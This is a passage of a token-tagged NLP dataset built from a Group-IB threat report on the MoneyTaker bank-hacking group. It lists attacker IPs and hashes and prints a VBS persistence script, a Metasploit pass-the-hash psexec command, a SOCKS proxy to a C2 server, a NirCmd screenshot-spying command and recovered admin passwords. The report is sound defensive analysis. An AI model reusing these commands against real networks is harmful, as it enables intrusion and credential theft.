signed VBN O O
SSL NNP O O
certificates NNS O O
before IN O O
the DT O O
attack NN O O
, , O O
indicating VBG O O
the DT O O
names NNS O O
of IN O O
popular JJ O O
brands NNS O O
in IN O O
the DT O O
fields NNS O O
, , O O
instead RB O O
of IN O O
filling VBG O O
them PRP O O
out RP O O
randomly RB O O
. . O O

Group-IB JJ O O
specialists NNS O O
have VBP O O
discovered VBN O O
the DT O O
use NN O O
of IN O O
the DT O O
following VBG O O
certificates NNS O O
: : O O
Issuer NN O O
SSL NNP O O
fingerprint NN O O
IP NNP O O
, , O O
where WRB O O
SSL NNP B-Entity 1
was VBD I-Entity O
used VBN I-Entity O
MetaBank NNP I-Entity O
LTD NNP I-Entity O
8b7fa4ef88a303bb47240c9b8012c80507074f2e CD I-Entity O
83.220.172.71 CD I-Entity O
Yahoo NNP I-Entity O
Inc NNP I-Entity O
. . I-Entity O
c29d79df9b5416fd416c31e57cd525dfc23a8f66 NN I-Entity O
37.46.133.190 CD I-Entity O
172.86.121.11 CD I-Entity O
Fiserv NNP I-Entity O
Inc NNP I-Entity O
Microsoft NNP I-Entity O
Ltd NNP I-Entity O
b3dd855fc1b32757bde5c9f737808f150d6f57e6 NN I-Entity O
146.185.243.19 CD I-Entity O
98cbe44e1a30448a3ff6be38e8b277ae189f9b45 CD I-Entity O
82.146.54.5 CD I-Entity O
Federal NNP I-Entity O
Reserve NNP I-Entity O
Bank NNP I-Entity O
5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a CD I-Entity O
188.120.235.201 CD I-Entity O
Bank NNP I-Entity O
of IN I-Entity O
America NNP I-Entity O
5922a06f03f6464921462c07842afb18da1577e9 CD I-Entity O
188.120.230.218 CD I-Entity O
188.120.230.235 CD I-Entity O
VMware NN I-Entity O
7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67 CD I-Entity O
185.141.25.222 CD I-Entity O
Persistence NN I-Entity O
server NN I-Entity O
Hackers NNS I-Entity O
try VBP I-Entity O
to TO I-Entity O
stay VB I-Entity O
as RB I-Entity O
inconspicuous JJ I-Entity O
as IN I-Entity O
possible JJ I-Entity O
, , I-Entity O
and CC I-Entity O
therefore RB I-Entity O
they PRP I-Entity O
use VBP I-Entity O
‘ JJ I-Entity O
fileless NN I-Entity O
’ NNP I-Entity O
malware NN I-Entity O
which WDT O O
only RB O O
exists VBZ O O
in IN O O
RAM NNP O O
and CC O O
is VBZ O O
destroyed VBN O O
after IN O O
reboot NN O O
. . O O

That DT O O
said VBD O O
, , O O
PowerShell NNP O O
and CC O O
VBS NNP O O
scripts NNS O O
help VBP O O
them PRP O O
to TO O O
ensure VB O O
persistence NN O O
in IN O O
the DT O O
system NN O O
. . O O

Scripts NNP O O
provide VBP O O
the DT O O
following JJ O O
benefits NNS O O
for IN O O
attackers NNS O O
: : O O
• RB O O
Malicious JJ O O
scripts NNS O O
are VBP O O
hard JJ O O
to TO O O
detect VB O O
by IN O O
means NNS O O
of IN O O
antivirus NN O O
protection NN O O
. . O O

Writing VBG O O
a DT O O
signature NN O O
for IN O O
a DT O O
script NN O O
without IN O O
false JJ O O
positives NNS O O
is VBZ O O
much RB O O
more RBR O O
difficult JJ O O
than IN O O
a DT O O
binary JJ O O
file NN O O
. . O O

• NN O O
Scripts NNS O O
are VBP O O
easy JJ O O
to TO O O
modify VB O O
, , O O
which WDT O O
makes VBZ O O
it PRP O O
easier JJR O O
for IN O O
attackers NNS O O
to TO O O
work VB O O
. . O O

• NN O O
It PRP O O
is VBZ O O
easy JJ O O
to TO O O
ensure VB O O
persistence NN O O
. . O O

Typically RB O O
, , O O
such JJ O O
scripts NNS O O
are VBP O O
stored VBN O O
in IN O O
the DT O O
registry NN O O
or CC O O
are VBP O O
called VBN O O
when WRB O O
certain JJ O O
events NNS O O
occur VBP O O
through IN O O
Windows NNP O O
Management NNP O O
Instrumentation NNP O O
( ( O O
WMI NNP O O
) ) O O
, , O O
Group NNP O O
Policy NN O O
Objects NNP O O
( ( O O
GPOs NNP O O
) ) O O
, , O O
Scheduled VBN O O
task NN O O
. . O O

Such JJ O O
scripts NNS O O
are VBP O O
very RB O O
simple NN O O
and CC O O
usually RB O O
their PRP$ O O
main JJ O O
task NN O O
is VBZ O O
to TO O O
download VB O O
the DT O O
main JJ O O
program NN O O
from IN O O
an DT O O
external JJ O O
or CC O O
local JJ O O
source NN O O
and CC O O
run VB O O
it PRP O O
. . O O

10 CD O O
The DT O O
Persistence NNP O O
server NN O O
is VBZ O O
used VBN O O
to TO O O
force VB O O
a DT O O
malicious JJ O O
file NN O O
to TO O O
be VB O O
launched VBN O O
if IN O O
the DT O O
attacked VBN O O
computer NN O O
has VBZ O O
been VBN O O
rebooted VBN O O
. . O O

A DT B-Entity 1
distinctive JJ I-Entity O
feature NN I-Entity O
of IN I-Entity O
this DT I-Entity O
group NN I-Entity O
is VBZ B-Action 2
the DT B-Entity 3
use NN I-Entity O
of IN I-Entity O
a DT I-Entity O
separate JJ I-Entity O
server NN I-Entity O
for IN I-Entity O
this DT I-Entity O
goal NN I-Entity O
. . O O

On IN O O
the DT O O
server NN O O
, , O O
they PRP O O
run VBP O O
a DT O O
script NN O O
that WDT O O
performs VBZ O O
two CD O O
checks NNS O O
: : O O
1 CD O O
. . O O

Checks NNS O O
if IN O O
the DT O O
User-agent JJ O O
field NN O O
is VBZ O O
equal JJ O O
to TO O O
WinHttp NNP O O
. . O O

If IN O O
it PRP O O
is VBZ O O
not RB O O
equal JJ O O
, , O O
requests NNS O O
are VBP O O
sent VBN O O
back RB O O
to TO O O
the DT O O
web NN O O
server NN O O
with IN O O
a DT O O
404 CD O O
error NN O O
code NN O O
( ( O O
page NN O O
not RB O O
found VBN O O
) ) O O
. . O O

If IN O O
equal JJ O O
to TO O O
WinHttp NNP O O
, , O O
it PRP O O
performs VBZ O O
the DT O O
second JJ O O
check NN O O
. . O O

2 CD O O
. . O O

Checks NNS O O
if IN O O
the DT O O
IP NNP O O
address NN O O
from IN O O
which WDT O O
the DT O O
request NN O O
is VBZ O O
made VBN O O
is VBZ O O
on IN O O
the DT O O
white JJ O O
list NN O O
. . O O

If IN O O
yes NNS O O
, , O O
then RB O O
the DT O O
malicious JJ O O
file NN O O
mencstager.exe NN O O
is VBZ O O
delivered VBN O O
. . O O

If IN O O
not RB O O
, , O O
rundll32.exe NN O O
is VBZ O O
transferred VBN O O
. . O O

51138beea3e2c21e CD O O
c44d0932c71762a8 NN O O
– VBZ O O
a DT O O
legitimate JJ O O
Windows NNP O O
file NN O O
. . O O

This DT O O
verification NN O O
complicates VBZ O O
investigative JJ O O
activity NN O O
of IN O O
researchers NNS O O
who WP O O
can MD O O
not RB O O
get VB O O
the DT O O
malicious JJ O O
file NN O O
because IN O O
they PRP O O
try VBP O O
to TO O O
download VB O O
it PRP O O
from IN O O
an DT O O
IP NNP O O
address NN O O
that WDT O O
is VBZ O O
not RB O O
on IN O O
the DT O O
white JJ O O
list NN O O
. . O O

11 CD O O
PROVISION NN O O
OF IN O O
THE NNP O O
MALWARE NNP O O
SURVIVABILITY NN O O
03 CD O O
Unlike IN O O
other JJ O O
groups NNS O O
conducting VBG O O
targeted JJ O O
attacks NNS O O
, , O O
MoneyTaker NNP O O
uses NNS O O
standard VBP O O
techniques NNS O O
to TO O O
provide VB B-Action 1
malware NN B-Entity 2
survivability NN I-Entity O
in IN I-Entity O
the DT I-Entity O
system NN I-Entity O
. . O O

Researchers NNS O O
have VBP O O
not RB O O
managed VBN O O
to TO O O
recover VB O O
the DT O O
full JJ O O
picture NN O O
of IN O O
the DT O O
incidents NNS O O
that WDT O O
occurred VBD O O
in IN O O
the DT O O
autumn NN O O
of IN O O
2016 CD O O
in IN O O
Russia NNP O O
, , O O
because IN O O
tracks NNS O O
of IN O O
successful JJ O O
attacks NNS O O
were VBD O O
carefully RB O O
removed VBN O O
. . O O

However RB O O
, , O O
Group-IB NNP O O
has VBZ O O
discovered VBN O O
that IN O O
hackers NNS O O
infiltrated VBD O O
the DT O O
network NN O O
of IN O O
a DT O O
Russian JJ O O
bank NN O O
by IN O O
gaining VBG O O
access NN O O
to TO O O
the DT O O
home NN O O
computer NN O O
of IN O O
the DT O O
bank NN O O
’ NNP O O
s NN O O
system NN O O
administrator NN O O
. . O O

One CD O O
of IN O O
the DT O O
methods NNS O O
to TO O O
ensure VB B-Action 1
malware NN B-Entity 2
survivability NN I-Entity O
in IN I-Entity O
the DT I-Entity O
system NN I-Entity O
was VBD B-Action 3
the DT B-Entity 4
creation NN I-Entity O
of IN I-Entity O
services NNS I-Entity O
using VBG I-Entity O
.bat NN I-Entity O
scripts NNS I-Entity O
that WDT I-Entity O
launched VBD I-Entity O
the DT I-Entity O
VNC NNP I-Entity O
server NN I-Entity O
. . O O

The DT B-Entity 1
contents NNS I-Entity O
of IN I-Entity O
the DT I-Entity O
at1.bat NN I-Entity O
file NN I-Entity O
: : O O
« JJ O O
c NN O O
: : O O
\Program JJ O O
Files\Cisco NNP O O
Systems\VPN NNP O O
Client\hostsec32.exe NNP O O
» NN O O
-install DT O O
« VBZ O O
Host NNP O O
Security NNP O O
Server NNP O O
» NN O O
The DT O O
contents NNS O O
of IN O O
the DT O O
at2.bat NN O O
file NN O O
: : O O
« JJ O O
c NN O O
: : O O
\Program JJ O O
Files\Cisco NNP O O
Systems\VPN NNP O O
Client\hostsec32.exe NNP O O
» NN O O
-uninstall DT O O
« VBZ O O
host NN O O
security NN O O
server NN O O
» NN O O
These DT O O
batch NN O O
files NNS O O
were VBD O O
called VBN O O
from IN O O
Windows NNP O O
Task NNP O O
Scheduler NNP O O
. . O O

In IN O O
US NNP O O
incidents NNS O O
, , O O
the DT B-Entity 1
attacker NN I-Entity O
used VBN I-Entity O
VBS NNP I-Entity O
scripts NNS I-Entity O
that WDT I-Entity O
created VBD I-Entity O
a DT I-Entity O
link NN I-Entity O
named VBN I-Entity O
« JJ I-Entity O
Task NNP I-Entity O
Scheduler NNP I-Entity O
» NNP I-Entity O
for IN B-Modifier 2
a DT B-Entity 3
specific JJ I-Entity O
user NN I-Entity O
in IN I-Entity O
the DT I-Entity O
startup NN I-Entity O
to TO I-Entity O
launch VB I-Entity O
the DT I-Entity O
malicious JJ I-Entity O
file NN I-Entity O
. . O O

Set NNP B-Entity 1
oWS MD I-Entity O
= VB I-Entity O
WScript.CreateObject NNP I-Entity O
( ( I-Entity O
« NNP I-Entity O
WScript.Shell NNP I-Entity O
» NNP I-Entity O
) ) I-Entity O
sLinkFile JJ I-Entity O
= NNP I-Entity O
« NNP I-Entity O
C NNP I-Entity O
: : I-Entity O
\Users\ JJ I-Entity O
< CD I-Entity O
% NN I-Entity O
username JJ I-Entity O
% NN I-Entity O
> NNP I-Entity O
\AppData\Roaming\Microsoft\ NN I-Entity O
Windows\Start NNP I-Entity O
Menu\Programs\Startup\taskhost.lnk NNP I-Entity O
» NN I-Entity O
Set NNP I-Entity O
oLink VBP I-Entity O
= JJ I-Entity O
oWS.CreateShortcut NN I-Entity O
( ( I-Entity O
sLinkFile NN I-Entity O
) ) I-Entity O
oLink.TargetPath NN I-Entity O
= NN I-Entity O
« NNP I-Entity O
C NNP I-Entity O
: : I-Entity O
\Users\ JJ I-Entity O
< CD I-Entity O
% NN I-Entity O
username JJ I-Entity O
% NN I-Entity O
> NNP I-Entity O
\AppData\Local\ NN I-Entity O
Temp\taskhost.exe NNP I-Entity O
» NN I-Entity O
‘ JJ I-Entity O
oLink.Arguments NNS I-Entity O
= VBP I-Entity O
« CD I-Entity O
» NN I-Entity O
‘ JJ I-Entity O
oLink.Description NN I-Entity O
= NNP I-Entity O
« NNP I-Entity O
Task NNP I-Entity O
Scheduler NNP I-Entity O
» NN I-Entity O
‘ NN I-Entity O
oLink.HotKey MD I-Entity O
= VB I-Entity O
« NNP I-Entity O
ALT+CTRL+F NNP I-Entity O
» NN I-Entity O
‘ JJ I-Entity O
oLink.IconLocation NN I-Entity O
= NNP I-Entity O
« NNP I-Entity O
C NNP I-Entity O
: : I-Entity O
\Users\ JJ I-Entity O
< CD I-Entity O
% NN I-Entity O
username JJ I-Entity O
% NN I-Entity O
> NNP I-Entity O
\AppData\Local\ NN I-Entity O
Temp\taskhost.exe NNP I-Entity O
, , I-Entity O
2 CD I-Entity O
» NN I-Entity O
‘ JJ I-Entity O
oLink.WindowStyle JJ I-Entity O
= NNP I-Entity O
« NNP I-Entity O
1 CD I-Entity O
» NN I-Entity O
‘ JJ I-Entity O
oLink.WorkingDirectory NN I-Entity O
= NNP I-Entity O
« NNP I-Entity O
C NNP I-Entity O
: : I-Entity O
\Users\ JJ I-Entity O
< CD I-Entity O
% NN I-Entity O
username JJ I-Entity O
% NN I-Entity O
> NNP I-Entity O
\AppData\ NN I-Entity O
Local\Temp NNP I-Entity O
» NN I-Entity O
oLink.Save NN I-Entity O
12 CD I-Entity O
04 CD I-Entity O
PROPAGATION NNP I-Entity O
ACROSS NNP I-Entity O
THE DT I-Entity O
NETWORK NNP I-Entity O
After IN O O
successfully RB O O
infecting VBG O O
one CD O O
of IN O O
the DT O O
computers NNS O O
and CC O O
gaining VBG O O
initial JJ O O
access NN O O
to TO O O
the DT O O
system NN O O
, , O O
the DT O O
attacker NN O O
performs VBZ O O
reconnaissance NN O O
of IN O O
the DT O O
local JJ O O
network NN O O
in IN O O
order NN O O
to TO O O
gain VB B-Action 2
domain NN B-Entity 3
administrator NN I-Entity O
privileges NNS I-Entity O
and CC O O
eventually RB O O
consolidate VB B-Action 4
control NN B-Entity 5
over IN I-Entity O
the DT I-Entity O
network NN I-Entity O
. . O O

Hackers NNS O O
use VBP O O
the DT O O
Metasploit NNP O O
tool NN O O
to TO O O
conduct VB B-Action 1
network NN B-Entity 2
reconnaissance NN I-Entity O
, , I-Entity O
search NN I-Entity O
for IN I-Entity O
vulnerable JJ I-Entity O
applications NNS I-Entity O
, , O O
exploit VB O O
vulnerabilities NNS O O
, , O O
escalate VBP O O
systems NNS O O
privileges NNS O O
, , O O
and CC O O
collect VB O O
information NN O O
. . O O

Gaining VBG O O
admin NN O O
privileges NNS O O
To TO O O
escalate VB O O
privileges NNS O O
up RB O O
to TO O O
the DT O O
local JJ O O
administrator NN O O
( ( O O
or CC O O
“ VB O O
SYSTEM NNP O O
” VB O O
local JJ O O
user NN O O
) ) O O
, , O O
attackers NNS O O
use VBP O O
exploit JJ O O
modules NNS O O
from IN O O
the DT O O
standard NN O O
Metasploit NNP O O
pack NN O O
, , O O
or CC O O
exploits NNS O O
designed VBN O O
to TO O O
bypass VB B-Action 1
the DT B-Entity 2
UAC NNP I-Entity O
technology NN I-Entity O
. . O O

With IN O O
local JJ O O
administrator NN O O
privileges NNS O O
they PRP O O
can MD O O
use VB O O
the DT O O
Mimikatz NNP O O
program NN O O
, , O O
which WDT O O
is VBZ O O
loaded VBN O O
into IN O O
the DT O O
memory NN O O
using VBG O O
Meterpreter NNP O O
, , O O
to TO O O
extract VB B-Action 1
unencrypted JJ B-Entity 2
Windows NNP I-Entity O
credentials NNS I-Entity O
. . O O

In IN O O
addition NN O O
to TO O O
the DT O O
standard JJ O O
modules NNS O O
from IN O O
the DT O O
Metasploit NNP O O
pack NN O O
, , O O
the DT O O
following VBG O O
tools NNS O O
are VBP O O
used VBN O O
to TO O O
escalate VB O O
privileges NNS O O
: : O O
Name NN O O
MD5 NN O O
Type NN O O
ASLRSideChannelAttack.exe $ O O
9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5d33cf8bff4 CD O O
LPE NNP O O
Win10x64 NNP O O
cve.bat NN O O
cve.exe NN O O
7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc9fa734a CD O O
BAT NNP O O
LPE NNP O O
executor NN O O
98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3646b6c8cb6 CD O O
cve-2016-7255 NN O O
cve-2016-7255.exe NN O O
5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3345da14a6b5 CD O O
cve-2016-7255 NN O O
cve-2016-7255test.exe NN O O
df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec4856f4bee NN O O
cve-2016-7255 NN O O
It PRP O O
is VBZ O O
interesting VBG O O
to TO O O
analyze VB O O
the DT O O
ASLRSideChannelAttack.exe NNP O O
file NN O O
. . O O

It PRP O O
was VBD O O
compiled VBN O O
on IN O O
October NNP O O
23 CD O O
, , O O
2016 CD O O
based VBN O O
on IN O O
codes NNS O O
presented VBN O O
at IN O O
the DT O O
Russian JJ O O
conference NN O O
ZeroNights NNS O O
2016 CD O O
. . O O

The DT O O
codes NNS O O
are VBP O O
available JJ O O
online NN O O
at IN O O
https NN O O
: : O O
//github.com/IOActive/I-know-where-your-page- JJ O O
lives NNS O O
. . O O

13 CD O O
In IN O O
addition NN O O
, , O O
they PRP O O
actively RB O O
searched VBD O O
for IN O O
passwords NNS O O
stored VBN O O
in IN O O
Active NNP O O
Directory NNP O O
group NN O O
policies NNS O O
by IN O O
exploiting VBG O O
the DT O O
MS14-025 NNP O O
vulnerability NN O O
and CC O O
the DT O O
corresponding JJ O O
Metasploit NNP O O
module NN O O
( ( O O
post/windows/gather/ NN O O
credentials/gpp NN O O
) ) O O
. . O O

After IN O O
receiving VBG O O
group NN O O
policy NN O O
files NNS O O
, , O O
the DT B-Entity 1
attacker NN I-Entity O
decrypted VBD O O
the DT O O
passwords NNS O O
that WDT O O
were VBD O O
stored VBN O O
there RB O O
and CC O O
used VBD O O
them PRP O O
on IN O O
other JJ O O
workstations NNS O O
. . O O

In IN O O
some DT O O
cases NNS O O
, , O O
passwords NNS O O
of IN O O
bank NN O O
systems NNS O O
’ VBP O O
accounts NNS O O
granting VBG O O
local JJ O O
administrator NN O O
privileges NNS O O
were VBD O O
very RB O O
weak JJ O O
. . O O

Here RB O O
is VBZ O O
an DT O O
example NN O O
of IN O O
domain NN O O
administrator NN O O
passwords NNS O O
that WDT O O
attackers NNS O O
recovered VBD O O
: : O O
User NNP O O
name NN O O
Encrypted VBN O O
value NN O O
of IN O O
the DT O O
password NN O O
field NN O O
Decrypted VBN O O
password NN O O
Administrator NN O O
Uj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KY NN O O
Wrongpassword1 NN O O
Administrator NN O O
n8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzI NN O O
System321 NN O O
Using VBG O O
the DT O O
Metasploit NNP O O
modules NNS O O
with IN O O
the DT O O
functionality NN O O
of IN O O
dumping VBG O O
Windows NNP O O
local JJ O O
users NNS O O
’ VBP O O
password JJ O O
hashes NNS O O
stored VBN O O
in IN O O
the DT O O
Security NNP O O
Accounts NNS O O
Manager NNP O O
( ( O O
hashdump NN O O
or CC O O
smart_hashdump NN O O
modules NNS O O
) ) O O
, , O O
hackers NNS O O
received VBD O O
the DT O O
local JJ O O
administrator NN O O
’ NNP O O
s NN O O
NTLM NNP O O
hash NN O O
, , O O
as RB O O
well RB O O
as IN O O
the DT O O
NTLM NNP O O
hash NN O O
and CC O O
unencrypted JJ O O
password NN O O
for IN O O
domain NN O O
users NNS O O
. . O O

Propagation NN O O
across IN O O
the DT O O
network NN O O
To TO O O
get VB O O
the DT O O
list NN O O
of IN O O
computers NNS O O
in IN O O
Active NNP O O
Directory NNP O O
, , O O
hackers NNS O O
often RB O O
use VBP O O
a DT O O
PowerShell NNP O O
script NN O O
named VBN O O
allpc.ps1 NN O O
, , O O
which WDT O O
was VBD O O
copied VBN O O
from IN O O
this DT O O
discussion NN O O
in IN O O
October NNP O O
2015 CD O O
: : O O
https NN O O
: : O O
//serverfault.com/questions/732681/export-simple-list-of-all- JJ O O
computers-in-multiple-ous-in-ad NN O O
To TO O O
propagate VB O O
across IN O O
the DT O O
network NN O O
, , O O
hackers NNS O O
used VBD O O
a DT O O
legitimate JJ O O
tool NN O O
psexec NN O O
, , O O
which WDT O O
is VBZ O O
typical JJ O O
for IN O O
network NN O O
administrators NNS O O
. . O O

This DT O O
tool NN O O
creates VBZ O O
a DT O O
local JJ O O
service NN O O
via IN O O
SMB/RPC NNP O O
protocol NN O O
, , O O
then RB O O
executes VBZ O O
and CC O O
deletes NNS O O
it PRP O O
. . O O

In IN O O
the DT O O
service NN O O
properties NNS O O
, , O O
the DT B-Entity 1
required JJ I-Entity O
command NN I-Entity O
is VBZ I-Entity O
set VBN I-Entity O
to TO I-Entity O
start VB I-Entity O
. . O O

The DT O O
attacker NN O O
used VBD O O
two CD O O
methods NNS O O
to TO O O
distribute VB O O
the DT O O
payload NN O O
: : O O
they PRP O O
placed VBD O O
executable JJ O O
files NNS O O
in IN O O
the DT O O
network NN O O
folder NN O O
, , O O
and CC O O
forced VBD O O
the DT O O
attacked JJ O O
computers NNS O O
to TO O O
start VB O O
them PRP O O
, , O O
or CC O O
indicated VBD O O
the DT O O
shell NN O O
code NN O O
directly RB O O
in IN O O
the DT O O
service NN O O
start NN O O
line NN O O
. . O O

For IN O O
passwords NNS O O
that WDT O O
were VBD O O
received VBN O O
as IN O O
an DT O O
NTLM NNP O O
hash NN O O
and CC O O
were VBD O O
not RB O O
decrypted VBN O O
, , O O
the DT O O
Pass-the-hash NNP O O
technique NN O O
was VBD O O
used VBN O O
, , O O
which WDT O O
allows VBZ O O
using VBG O O
an DT O O
NTLM NNP O O
hash NN O O
for IN O O
authentication NN O O
without IN O O
password NN O O
. . O O

To TO O O
do VB O O
this DT O O
, , O O
the DT O O
same JJ O O
legitimate JJ O O
Metasploit NNP O O
’ NNP O O
s VBD O O
psexec JJ O O
modules NNS O O
were VBD O O
used VBN O O
without IN O O
any DT O O
modification NN O O
. . O O

14 CD O O

use NN B-Entity 1
auxiliary/admin/smb/psexec JJ I-Entity O
_ NN I-Entity O
command NN I-Entity O
set VBN I-Entity O
COMMAND NNP I-Entity O
start NN I-Entity O
\\\\10.1.5.35\\tmp\\msc7.exe NN I-Entity O
set NN I-Entity O
RHOSTS NNP I-Entity O
10.1.5.35 CD I-Entity O
set VBN I-Entity O
SMBUser NNP I-Entity O
Administrator NNP I-Entity O
set VBN I-Entity O
SMBPass NNP I-Entity O
aad3b435b51404eeaad3b435b51404ee:23cec95759ea5880 NN I-Entity O
adf1794f475c23cd NN I-Entity O
set VBN I-Entity O
SMBDomain NNP I-Entity O
WORKGROUP NNP I-Entity O
After IN O O
gaining VBG O O
access NN O O
to TO O O
new JJ O O
systems NNS O O
, , O O
attackers NNS B-Entity 2
repeated VBD B-Action 3
the DT B-Entity 4
above-mentioned JJ I-Entity O
procedure NN I-Entity O
to TO I-Entity O
collect VB I-Entity O
passwords NNS I-Entity O
. . O O

Remote NNP O O
access NN O O
Until IN O O
October NNP O O
2017 CD O O
, , O O
hackers NNS O O
remotely RB O O
accessed VBD O O
systems NNS O O
of IN O O
interest NN O O
using VBG O O
standard JJ O O
Metasploit NNP O O
tools NNS O O
, , O O
as RB O O
well RB O O
as IN O O
legitimate JJ O O
remote NN O O
access NN O O
programs NNS O O
. . O O

On IN O O
hosts NNS O O
where WRB O O
Meterpreter NNP O O
was VBD O O
launched VBN O O
, , O O
hackers NNS O O
set VBD O O
up RP O O
a DT O O
SOCKS NNP O O
proxy NN O O
server NN O O
, , O O
which WDT O O
allowed VBD O O
them PRP O O
to TO O O
remotely RB O O
send VB O O
commands NNS O O
within IN O O
the DT O O
local JJ O O
network NN O O
. . O O

To TO O O
create VB O O
a DT O O
connection NN O O
via IN O O
SOCKS NNP O O
proxy NN O O
, , O O
they PRP O O
primarily RB O O
used VBD O O
ports NNS O O
7080 CD O O
and CC O O
1808 CD O O
: : O O
use NN O O
auxiliary/server/socks4a NN O O
show NN O O
options NNS O O
set VBN O O
SRVHOST NNP O O
_ NNP O O
c2serverIP NN O O
_ NN O O
set VBN O O
SRVPORT NNP O O
7080 CD O O
In IN O O
addition NN O O
, , O O
they PRP O O
actively RB O O
used VBD O O
various JJ O O
VNC NNP O O
clients NNS O O
such JJ O O
as IN O O
Fileless NN O O
VNC NNP O O
, , O O
VNC NNP O O
, , O O
UltraVNC NNP O O
and CC O O
TightVNC NNP O O
Portable NNP O O
versions NNS O O
x32 NN O O
and CC O O
x64 NN O O
. . O O

In IN O O
the DT O O
US NNP O O
, , O O
they PRP O O
used VBD O O
the DT O O
LogMeIn NNP O O
Hamachi NNP O O
solution NN O O
for IN O O
remote NN O O
access NN O O
. . O O

In IN O O
one CD O O
incident NN O O
, , O O
to TO O O
ensure VB O O
continuous JJ O O
remote JJ O O
access NN O O
, , O O
hackers NNS O O
gained JJ O O
access NN O O
to TO O O
the DT O O
firewall NN O O
, , O O
where WRB O O
they PRP O O
configured VBD O O
a DT B-Entity 1
tunnel NN I-Entity O
to TO I-Entity O
the DT I-Entity O
C NNP I-Entity O
& CC I-Entity O
C NNP I-Entity O
server NN I-Entity O
. . O O

Also RB O O
, , O O
to TO O O
secure VB O O
connections NNS O O
to TO O O
its PRP$ O O
C NNP O O
& CC O O
C NNP O O
server NN O O
, , O O
hackers NNS B-Entity 1
established VBD B-Action 2
an DT B-Entity 3
SSH NNP I-Entity O
tunnel NN I-Entity O
using VBG I-Entity O
a DT I-Entity O
legitimate JJ I-Entity O
tool NN I-Entity O
- : O O
Plink NN O O
. . O O

15 CD O O
05 CD O O
SPYING NN O O
ON RP O O
LEGITIMATE JJ O O
USERS NNS O O
To TO O O
conduct VB O O
a DT O O
successful JJ O O
attack NN O O
, , O O
hackers NNS O O
need VBP O O
to TO O O
monitor VB O O
legitimate JJ O O
activity NN O O
of IN O O
the DT O O
victim NN O O
bank NN O O
’ NNP O O
s VBZ O O
users NNS O O
and CC O O
financial JJ O O
operators NNS O O
to TO O O
then RB O O
repeat NN O O
the DT O O
same JJ O O
actions NNS O O
. . O O

The DT O O
MoneyTaker NNP O O
group NN O O
uses VBZ O O
the DT O O
following JJ O O
tools NNS O O
to TO O O
spy VB O O
on IN O O
employees NNS O O
: : O O
• VB O O
A DT O O
legitimate JJ O O
tool NN O O
NirCmd NNP O O
• JJ O O
Self-developed NNP O O
tools NNS O O
- : O O
‘ NN O O
screenshotter NN O O
’ NNP O O
and CC O O
‘ NNP O O
keylogger NNP O O
’ NN O O
NirCmd NNP O O
is VBZ O O
a DT O O
small JJ O O
command-line JJ O O
utility NN O O
, , O O
with IN O O
the DT O O
functionality NN O O
similar JJ O O
to TO O O
psexec VB O O
. . O O

It PRP O O
allows VBZ O O
hackers NNS O O
to TO O O
remotely RB O O
execute VB O O
various JJ O O
commands NNS O O
: : O O
write NN O O
and CC O O
delete JJ O O
values NNS O O
and CC O O
keys NNS O O
in IN O O
the DT O O
Registry NNP O O
, , O O
write NN O O
values NNS O O
into IN O O
INI NNP O O
file NN O O
, , O O
connect NN O O
to TO O O
a DT O O
VPN NNP O O
network NN O O
, , O O
restart NN O O
windows NNS O O
or CC O O
shut RB O O
down RP O O
the DT O O
computer NN O O
, , O O
change VBP O O
the DT O O
created/modified JJ O O
date NN O O
of IN O O
a DT O O
file NN O O
, , O O
change NN O O
display NN O O
settings NNS O O
, , O O
turn VB O O
off RP O O
the DT O O
monitor NN O O
, , O O
and CC O O
many JJ O O
more JJR O O
. . O O

One CD O O
of IN O O
the DT O O
most RBS O O
important JJ O O
capabilities NNS O O
for IN O O
attackers NNS O O
is VBZ O O
taking VBG O O
screenshots NNS O O
. . O O

For IN O O
example NN O O
, , O O
by IN O O
running VBG O O
the DT O O
following JJ O O
command NN O O
: : O O
nircmd.exe JJ O O
loop VBD O O
10 CD O O
60000 CD O O
savescreenshot JJ O O
c NNS O O
: : O O
\temp\ NN O O
scr~ JJ O O
$ $ O O
currdate.MM JJ O O
_ NNP O O
dd NN O O
_ NNP O O
yyyy RB O O
$ $ O O
-~ JJ O O
$ $ O O
currtime.HH JJ O O
_ NNP O O
mm NN O O
_ NNP O O
ss VBD O O
$ $ O O
.png NNS O O
10 CD O O
screenshots NNS O O
will MD O O
be VB O O
taken VBN O O
with IN O O
an DT O O
interval NN O O
of IN O O
60 CD O O
seconds NNS O O
. . O O

However RB O O
, , O O
this DT O O
functionality NN O O
was VBD O O
not RB O O
enough RB O O
for IN O O
the DT O O
group NN O O
, , O O
therefore RB O O
they PRP O O
created VBD O O
their PRP$ O O
own JJ O O
unique NN O O
tools NNS O O
designed VBN O O
to TO O O
take VB O O
screenshots NNS O O
and CC O O
capture NN O O
keystrokes NNS O O
. . O O

Name NN B-Entity 1
MD5 NN I-Entity O
Type NN I-Entity O
perfmon.exe NN I-Entity O
2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108 CD I-Entity O
e949800e6 NN I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/Screenshotter NNP I-Entity O
perfmonpe.exe NN I-Entity O
ff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b30 NN I-Entity O
7b586ac6 CD I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/Screenshotter NNP I-Entity O
recycler.exe NN I-Entity O
xkey.exe NN I-Entity O
xkey_x86.dll NN I-Entity O
206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474 CD I-Entity O
b327e564b NN I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/Screenshotter NNP I-Entity O
b2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b4 NN I-Entity O
7d0d2a33d CD I-Entity O
Keylogger/Screenshotter NN I-Entity O
60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a CD I-Entity O
36a90375dd CD I-Entity O
Keylogger/Screenshotter NN I-Entity O
16 CD I-Entity O
These DT I-Entity O
programs NNS I-Entity O
are VBP O O
designed VBN O O
to TO O O
capture VB O O
keystrokes NNS O O
, , O O
take VB O O
